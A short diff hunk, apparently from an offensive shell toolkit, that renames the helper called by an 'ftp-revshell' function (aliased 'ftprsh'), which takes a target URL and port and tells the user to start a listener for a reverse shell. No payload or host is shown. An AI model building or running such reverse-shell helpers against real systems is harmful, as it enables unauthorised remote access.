@@ -546,7 +546,7 @@ ftp-revshell() {
   echo "[!] other terminal: listen $port"
   echo "========================"
 
-  _rcecurl-trigger "$url" "$port"
+  _webrsh-trigger "$url" "$port"
 }
 
 alias ftprsh='ftp-revshell'
